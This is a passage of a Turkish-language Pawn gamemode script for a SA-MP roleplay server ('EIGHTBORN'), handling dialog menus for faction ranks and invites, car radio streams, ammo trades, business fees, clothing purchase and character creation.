							    format(mstring, sizeof(mstring), "Aracýnýzý %s adlý birlik aracý yaptýnýz.",Birlik[Karakter[playerid][birlik]][fisim]);
							    Arac[id][abirlik] = Karakter[playerid][birlik];
							    Arac[id][atip] = 2;
							    Bilgi(playerid, mstring);

							}
							else
							{
							    new mstring[128];
							    format(mstring, sizeof(mstring), "Aracýnýzý %s adlý birlik aracý olmaktan çýkardýnýz.",Birlik[Karakter[playerid][birlik]][fisim]);
                                Arac[id][abirlik] = 255;
                                Arac[id][atip] = 1;
                                Bilgi(playerid, mstring);
							}
							AracKaydet(id);
				        }
				        else Hata(playerid, "Aracýn sahibi deðilsiniz."), FactMenu(playerid);
				    }
				    else Hata(playerid, "Araçýn içerisinde olmanýz gerekmektedir."), FactMenu(playerid);
				}
				case 2:
				{
				    new str[1024];
    				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe1]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe2]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe3]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe4]);
				    strcat(str, "\n");
				    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe5]);
				    strcat(str, "\n");
				    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe6]);
				    strcat(str, "\n");
				    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe7]);
				    strcat(str, "\n");
                    strcat(str, Birlik[Karakter[playerid][birlik]][rutbe8]);
					strcat(str, "\n");
					strcat(str, Birlik[Karakter[playerid][birlik]][rutbe9]);
					strcat(str, "\n");
					strcat(str, Birlik[Karakter[playerid][birlik]][rutbe10]);
					strcat(str, "\n");
					strcat(str, Birlik[Karakter[playerid][birlik]][rutbe11]);
					strcat(str, "\n");
        			strcat(str, Birlik[Karakter[playerid][birlik]][rutbe12]);
			        if(Birlik[Karakter[playerid][birlik]][seviye] >= 2)
					{
				        strcat(str, "\n");
				        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe13]);
				        strcat(str, "\n");
				        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe14]);
				        strcat(str, "\n");
						strcat(str, Birlik[Karakter[playerid][birlik]][rutbe15]);
				        strcat(str, "\n");
				        if(Birlik[Karakter[playerid][birlik]][seviye] >= 3)
				        {
             				strcat(str, Birlik[Karakter[playerid][birlik]][rutbe16]);
					        strcat(str, "\n");
					        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe17]);
					        strcat(str, "\n");
					        if(Birlik[Karakter[playerid][birlik]][seviye] >= 4)
							{
						       	strcat(str, Birlik[Karakter[playerid][birlik]][rutbe18]);
						        strcat(str, "\n");
						        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe19]);
						        strcat(str, "\n");
						        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe20]);
							}
						}
					}
			        ShowPlayerDialog(playerid, 221, DIALOG_STYLE_LIST, BirlikBaslik(playerid), str, "Ayarla", "Geri");
				}
				case 3:
				{
				    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
                    ShowPlayerDialog(playerid, 222, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), "Birliðe davet etmek istediðiniz oyuncu idsini girin:", "Tamam", "Geri");
				}
				case 4:
				{
					new mstring[2048], targetrank[50];
					foreach(new i : Player)
					{
					    if(Karakter[i][birlik] == Karakter[playerid][birlik])
					    {
					        switch(Karakter[i][rutbe])
							{
								case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe1]);
								case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe2]);
						  		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe3]);
						    	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe4]);
							    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe5]);
							    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe6]);
								case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe7]);
								case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe8]);
								case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe9]);
							 	case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe10]);
							 	case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe11]);
							 	case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe12]);
							 	case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe13]);
							 	case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe14]);
							 	case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe15]);
							 	case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe16]);
							 	case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe17]);
							 	case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe18]);
							 	case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe19]);
							 	case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[i][birlik]][rutbe20]);
							}
       						if(BirlikYetkili(i)) format(mstring, sizeof(mstring), "%s[%d] %s\t{B3B3B3}%s\t"C1"[Yetkili]\n",mstring,i,OyuncuAdiniBul(i),targetrank);
							//if(Karakter[playerid][rutbe] == 1) format(mstring, sizeof(mstring), "%s[%d] %s\t{B3B3B3}%s\t"C1"[Lider]\n",mstring,i,OyuncuAdiniBul(i),targetrank);
    						else format(mstring, sizeof(mstring), "%s[%d] %s\t{B3B3B3}%s\n",mstring,i,OyuncuAdiniBul(i),targetrank);
							//strcat(mstring,nstring,sizeof(mstring));
						}
					}
					ShowPlayerDialog(playerid, 219, DIALOG_STYLE_TABLIST, BirlikBaslik(playerid), mstring, "Seç", "Geri");
				}
				case 5:
				{
				    //üyeler
				}
				case 6:
				{
				    //online saat
				}
				case 7:
				{
				    //aktiflik
				}
				case 8:
				{
					new mstring[128];
       		 		format(mstring, sizeof(mstring), "Ýþlem\t#\n"NOKTA" Para Yatýr\n"NOKTA" Para Çek\n \n"NOKTA" Kasadaki Para\t %d"DOLAR"$", Birlik[Karakter[playerid][birlik]][kasa]);
       		 		ShowPlayerDialog(playerid, 459, DIALOG_STYLE_TABLIST_HEADERS, BirlikBaslik(playerid), mstring, "Seç", "Ýptal");
				}
				case 9:
				{
				    new mstring[2048];
					for(new i;i<MAX_VEHICLES;i++)
					{
					    if(Karakter[playerid][birlik] == Arac[i][abirlik])
						{
						    format(mstring, sizeof(mstring), "%s%s\t[{B3B3B3}%d{FFFFFF}]\n",mstring,VehicleName[GetVehicleModel(i)-400][0],i);
						}
					}
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_TABLIST, BirlikBaslik(playerid), mstring, "Geri", "");
				}
				case 10:
				{
				    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
				    ShowPlayerDialog(playerid, 288, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), ""C1"Çýkarmak istediðiniz oyuncunun adýný yazýn:\n"C2"(Örnek:Meta_Test)", "Birlik Çýkar", "Ýptal");
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 218)
	{
	    if(response)
	    {
	        if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
			if(strlen(inputtext) > 32) return Hata(playerid, "Birliðinizin ismi en fazla 32 karakter olabilir."), ShowPlayerDialog(playerid, 218, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), "Deðiþtirmek istediðiniz birlik ismini girin:", "Tamam", "Geri");
			new mstring[256];
			format(mstring, sizeof(mstring), "Birliðinizin ismi %s olarak deðiþmiþtir.", inputtext);
			format(Birlik[Karakter[playerid][birlik]][fisim], 32, "%s", inputtext);
			FactMenu(playerid);
			BirlikKaydet(Karakter[playerid][birlik]);
		}
		else
		{
		    FactMenu(playerid);
		}
		return 1;
	}
	if(dialogid == 219)
	{
		if(response)
		{
		    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
		    new listtid=-1;
			foreach(new i : Player)
			{
			    if(Karakter[playerid][birlik] == Karakter[i][birlik])
			    {
					listtid++;
					if(listtid != -1 && listitem == listtid)
					{
					    factayarliyo[playerid] = i;
						new mstring[128];
						format(mstring, sizeof(mstring), ""C1"%s[%d]\t"C2"%s\n"NOKTA" "C2"Rütbe Ver\n"NOKTA" "C2"Birlik Çýkar\n"NOKTA" "C2"Yetkili Yap",OyuncuAdiniBul(i),i,OyuncuRutbe(i));
					    ShowPlayerDialog(playerid, 231, DIALOG_STYLE_TABLIST, BirlikBaslik(playerid), mstring, "Tamam", "Geri");
					}
			    }
			}
		}
		else
		{
		    FactMenu(playerid);
		}
	    return 1;
	}
	if(dialogid == 220)
	{
	    if(response)
	    {
	        if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
			for(new i=0;i<MAX_VEHICLES;i++)
			{
			    if(Karakter[playerid][birlik] == Arac[i][abirlik])
			    {
			        if(!IsVehicleInUse(i))
			        {
					    MotoruKapat(i);
				        Aractamiri(i);
				        SetVehicleToRespawn(i);
					}
				}
			}
			Bilgi(playerid, "Araçlara respawn atýldý.");
			FactMenu(playerid);
	    }
	    else
	    {
	        FactMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 221)
	{
		if(response)
		{
		    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
		    new str[256];
		    switch(listitem)
			{
		    	case 0:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe1]);
		    	case 1:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe2]);
		    	case 2:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe3]);
		    	case 3:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe4]);
		    	case 4:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe5]);
		    	case 5:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe6]);
		    	case 6:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe7]);
		    	case 7:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe8]);
		    	case 8:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe9]);
		    	case 9:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe10]);
		    	case 10:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe11]);
		    	case 11:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe12]);
		    	case 12:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe13]);
		    	case 13:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe14]);
		    	case 14:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe15]);
		    	case 15:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe16]);
		    	case 16:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe17]);
		    	case 17:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe18]);
		    	case 18:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe19]);
		    	case 19:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			SetPVarInt(playerid, "MG_Secili_Rutbe", listitem);
			ShowPlayerDialog(playerid, 223, DIALOG_STYLE_INPUT, BirlikBaslik(playerid), str, "Ayarla", "Geri");
			return 1;
		}
		else FactMenu(playerid);
		return 1;
	}
	if(dialogid == 222)
	{
	    if(response)
	    {
	        if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
		    new id = strval(inputtext);
		    if(IsPlayerConnected(id) && id != playerid)
		    {
      			if(Karakter[id][rutbe] != 1)
		        {
					if(Karakter[id][birlik] != Karakter[playerid][birlik])
					{
						if(Karakter[id][level] < 3) return Hata(playerid, "Bir oyuncunun birliðe girebilmesi için en az 3. seviye olmasý gerekmektedir.");
						if(Karakter[id][birlik] != 0) return Hata(playerid, "Davet etmeye çalýþtýðýnýz kiþi baþka bir birlikte. Önce bu birlikten çýkmasý gerekmektedir.");
						switch(Birlik[Karakter[playerid][birlik]][ftip]) {
							case 9, 10, 11, 13, 14, 15: {
								if(CheckSubCharacter(id)) return Hata(playerid, "Kiþi alt karakterde olduðundan dolayý illegal birliðe giremez.");
							}
						}
						Bilgi(playerid, "Oyuncuya davet isteði yolladýnýz.");
       					SetPVarInt(id, "DavetEden", playerid);
       					new mstring[256];
       					FactMenu(playerid);
						format(mstring,sizeof(mstring),"{FFFFFF}%s adlý kiþi sizi %s isimli birliðe davet ediyor. Kabul ediyor musunuz?",OyuncuAdiniBul(playerid), Birlik[Karakter[playerid][birlik]][fisim]);
						ShowPlayerDialog(id,506,DIALOG_STYLE_MSGBOX,BirlikBaslik(playerid),mstring,"Evet","Hayýr");
		    		}
		    		else Hata(playerid, "Oyuncu zaten sizin oluþumunuzda."), FactMenu(playerid);
		        }
		        else Hata(playerid, "Oyuncu oluþumda lider konumunda."), FactMenu(playerid);
		    }
		    else Hata(playerid, "Hatalý id belirttiniz."), FactMenu(playerid);
		}
		else FactMenu(playerid);
		return 1;
	}
	if(dialogid == 223)
	{
	    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return FactMenu(playerid);
		if(response)
		{
		    new str[256];
		    switch(GetPVarInt(playerid, "MG_Secili_Rutbe"))
			{
		    	case 0:format(Birlik[Karakter[playerid][birlik]][rutbe1], 50, inputtext);
		    	case 1:format(Birlik[Karakter[playerid][birlik]][rutbe2], 50, inputtext);
		    	case 2:format(Birlik[Karakter[playerid][birlik]][rutbe3], 50, inputtext);
		    	case 3:format(Birlik[Karakter[playerid][birlik]][rutbe4], 50, inputtext);
		    	case 4:format(Birlik[Karakter[playerid][birlik]][rutbe5], 50, inputtext);
		    	case 5:format(Birlik[Karakter[playerid][birlik]][rutbe6], 50, inputtext);
		    	case 6:format(Birlik[Karakter[playerid][birlik]][rutbe7], 50, inputtext);
		    	case 7:format(Birlik[Karakter[playerid][birlik]][rutbe8], 50, inputtext);
		    	case 8:format(Birlik[Karakter[playerid][birlik]][rutbe9], 50, inputtext);
		    	case 9:format(Birlik[Karakter[playerid][birlik]][rutbe10], 50, inputtext);
		    	case 10:format(Birlik[Karakter[playerid][birlik]][rutbe11], 50, inputtext);
		    	case 11:format(Birlik[Karakter[playerid][birlik]][rutbe12], 50, inputtext);
		    	case 12:format(Birlik[Karakter[playerid][birlik]][rutbe13], 50, inputtext);
		    	case 13:format(Birlik[Karakter[playerid][birlik]][rutbe14], 50, inputtext);
		    	case 14:format(Birlik[Karakter[playerid][birlik]][rutbe15], 50, inputtext);
		    	case 15:format(Birlik[Karakter[playerid][birlik]][rutbe16], 50, inputtext);
		    	case 16:format(Birlik[Karakter[playerid][birlik]][rutbe17], 50, inputtext);
		    	case 17:format(Birlik[Karakter[playerid][birlik]][rutbe18], 50, inputtext);
		    	case 18:format(Birlik[Karakter[playerid][birlik]][rutbe19], 50, inputtext);
		    	case 19:format(Birlik[Karakter[playerid][birlik]][rutbe20], 50, inputtext);
			}
			format(str, 256, "Rütbe ismi '%s' olarak deðiþtirildi.",inputtext);
			Bilgi(playerid, str);
			BirlikKaydet(Karakter[playerid][birlik]);
			FactMenu(playerid);
		}
		else FactMenu(playerid);
		return 1;
	}
	if(dialogid == 224)
	{
	    if(response)
	    {
	        meslekbul[playerid] = 1;
	        if(listitem == 0)
			{
				SetPlayerCheckpoint(playerid, Veriler[taksiX], Veriler[taksiY], Veriler[taksiZ], 5.0);
			}
   			if(listitem == 1)
			{
				SetPlayerCheckpoint(playerid, Veriler[balikX], Veriler[balikY], Veriler[balikZ], 5.0);
			}
   			if(listitem == 2)
			{
				SetPlayerCheckpoint(playerid, Veriler[pizzaX], Veriler[pizzaY], Veriler[pizzaZ], 5.0);
			}
			if(listitem == 3)
			{
				SetPlayerCheckpoint(playerid, 583.7595,-1388.0160,13.8931, 5.0);
			}
			if(listitem == 4)
			{
				SetPlayerCheckpoint(playerid, 2219.3762,-2666.3638,13.5399, 5.0);
			}
			if(listitem == 5)
			{
				SetPlayerCheckpoint(playerid, 2281.1309,-2365.0793,13.5469, 5.0);
			}
	    }
	    return 1;
	}
	if(dialogid == 225)
	{
	    if(response)
	    {
	        switch(listitem)
			{
				case 0: {
					foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://us4.internet-radio.com:8266/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 1: {
                    foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://us4.internet-radio.com:8258/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 2: {
				    foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://uk2.internet-radio.com:8284/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 3: {
                    foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://www.partyviberadio.com:8040/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 4: {
                    foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://us3.internet-radio.com:8297/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 5: {
                    foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
					    {
	    					PlayAudioStreamForPlayer(x, "http://192.211.51.158:8010/listen.pls");
	 						sarkidinliyo[x] = 1;
						}
					}
				}
				case 6:
				{
            		ShowPlayerDialog(playerid, 226, DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Araç Radyo","Burada URL'yi yazýnýz.","Oynat","Kapat");
        		}
        		case 7:
        		{
        		    ShowPlayerDialog(playerid, 227, DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Araç Radyo","Burada URL'yi yazýnýz.","Oynat","Kapat");
        		}
				case 8:
				{
					foreach(new x : Player)
					{
					    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)) && sarkidinliyo[playerid] == 1)
					    {
 							sarkidinliyo[x] = 0;
 							PlayAudioStreamForPlayer(x, "EIGHTBORN - Araç Radyo durduruldu.");
 							StopAudioStreamForPlayer(x);
						}
				 	}
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 226)
	{
	    if(response)
	    {
	    	if(strlen(inputtext) < 64 || strlen(inputtext) > 0)
        	{
				foreach(new x : Player)
				{
				    if(IsPlayerInVehicle(x, GetPlayerVehicleID(playerid)))
				    {
    					PlayAudioStreamForPlayer(x, inputtext);
 						sarkidinliyo[x] = 1;
					}
				}
			}
		}
		return 1;
	}
	if(dialogid == 227)
	{
	    if(response)
	    {
	    	if(strlen(inputtext) < 64 || strlen(inputtext) > 0)
        	{
				new url[128],link[256],requestlink[512];
				format(url, sizeof(url), "%s", inputtext);
				if(strfind(url,"&") != -1) strmid(url,url,0,strfind(url,"&"), 128);
				format(link,256,"%s",url);
				format(requestlink,sizeof(requestlink),"michaelbelgium.me/ytconverter/convert.php?youtubelink=%s",link);
				HTTP(playerid, HTTP_GET, requestlink, "", "OnVpsResponse2");
	            Bilgi(playerid, "Youtube videosunun mp3'e çevirilmesini biraz bekleyin.");
			}
		}
		return 1;
	}
	if(dialogid == 228)
	{
		new silahveren = GetPVarInt(playerid, "SilahVeren");
		if(response)
		{
		    new alinansilah = GetPVarInt(playerid, "AlinanSilah");
		    new alinanmermi = GetPVarInt(playerid, "AlinanMermi");

            RemovePlayerWeapon(playerid, alinansilah);
      		Karakter[playerid][MermiM][alinansilah] += alinanmermi;

		    RemovePlayerWeapon(silahveren, alinansilah);
			Karakter[silahveren][MermiM][alinansilah] -= alinanmermi;

			//OyuncuSilahKaydet[playerid][alinansilah] = 1;
			//OyuncuSilahKaydet[silahveren][alinansilah] = 1;

			new string[128];
			new silahisim1[60];
		    switch(alinansilah)
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
		    format(string, sizeof(string), "%s'den %d mermi aldýnýz.", OyuncuAdiniBul(silahveren), alinanmermi);
		    Bilgi(playerid, string);
		    format(string, sizeof(string), "%s'e %d mermi verdiniz.", OyuncuAdiniBul(playerid), alinanmermi);
		    Bilgi(silahveren, string);

		    format(string, sizeof(string), "%s'e %d mermi verdi.", OyuncuAdiniBul(playerid), alinanmermi);
		    Log(silahveren, string);
		    format(string, sizeof(string), "%s'den %d mermi aldý.", OyuncuAdiniBul(silahveren), alinanmermi);
		    Log(playerid, string);
		}
		else
		{
			Hata(silahveren, "Silah teklifiniz reddedildi.");
		}
		return 1;
	}
	if(dialogid == 229)
	{
	    if(response)
	    {
	        if(strval(inputtext) < 0 || strval(inputtext) > 300)
	        {
				Hata(playerid, "Ýþyeri giriþ ücretiniz 300$'dan fazla olamaz.");
	            return 1;
			}
	        new string[128];
	        new yakindaki = IsyeriMesafesi(2.0,playerid);
	        if(yakindaki == 0)
	        {
	            return 1;
			}
			Isyeri[yakindaki][girisucreti] = strval(inputtext);
	        IsyeriKaydet(yakindaki);
	        format(string, sizeof(string), "Ýþyeri bilgileri kayýt edildi! Yeni giriþ ücreti: %d olarak deðiþtirildi.",strval(inputtext));
	        Bilgi(playerid, string);
	        IsyeriAyarla(yakindaki);
		}
		return 1;
	}
	if(dialogid == 230)
	{
	    if(response)
	    {
	        if(GetPlayerCash(playerid) < KiyafetUcreti[playerid]) return Hata(playerid, "Yeterli paranýz yok.");
	        new iisid = GetPVarInt(playerid, "IsyeriBuy");
			if(!IsyeriYetkilisi(playerid, iisid)) Isyeri[iisid][ikasa] += KiyafetUcreti[playerid]/2;
	        Bilgi(playerid, "Baþarýyla kýyafet aldýnýz.");
	        GivePlayerCash(playerid, -KiyafetUcreti[playerid]);
	        //Karakter[playerid][skin] = SectigiKiyafet[playerid];
	        //SetPlayerSkin(playerid, SectigiKiyafet[playerid]);
	        SetPVarInt(playerid, "SlotSeciyor", SectigiKiyafet[playerid]);
	        SectigiKiyafet[playerid] = 0;
			KiyafetUcreti[playerid] = 0;
			new _bol[5][6], mstring[256];
			strexplode(_bol, Karakter[playerid][kiyafetler], "|");
			for(new i;i<5;i++)
			{
				if(strval(_bol[i]) != 0)
				{
					format(mstring, sizeof(mstring), "%sSlot"C5"%d)\t\t "C2"%s(%d)\n", mstring, i+1, GetSkinModelNameEx(strval(_bol[i])), strval(_bol[i]));
				}
				else format(mstring, sizeof(mstring), "%sSlot"C5"%d)\t\t "C2"Boþ\n", mstring, i+1);
			}
			ShowPlayerDialog(playerid, 283, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Slot Seç", mstring, "Seç", "");
	    }
	    else
	    {
	        if(SectigiKiyafet[playerid] >= 25000) {
	            if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, yenierkekkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, yenierkekkiyafetsiyah, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, yenikadinkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, yenikadinkiyafetsiyah, "Kiyafet Secimi");
	        }
	        else {
		        if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, erkekkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, erkekkiyafetsiyah, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kadinkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kadinkiyafetsiyah, "Kiyafet Secimi");
			}
	    }
		return 1;
	}
	if(dialogid == 666)
	{
	    if(response)
	    {
	 	Karakter[playerid][skin] = SectigiKiyafet[playerid];
		KarakterKaydet(playerid);
		if(!Karakter[playerid][yas])
					{
					    ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
					}
					else if(!DilKontrolEx(playerid))
					{
					    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
					}
					else if(!Karakter[playerid][boy])
					{
					    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
					}
					else if(!Karakter[playerid][kilo])
					{
					    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
					}
					else if(!Karakter[playerid][gozrenk])
					{
					    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
					}
					else if(!Karakter[playerid][sacrenk])
					{
					    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
					}
	    }
	    else
	    {
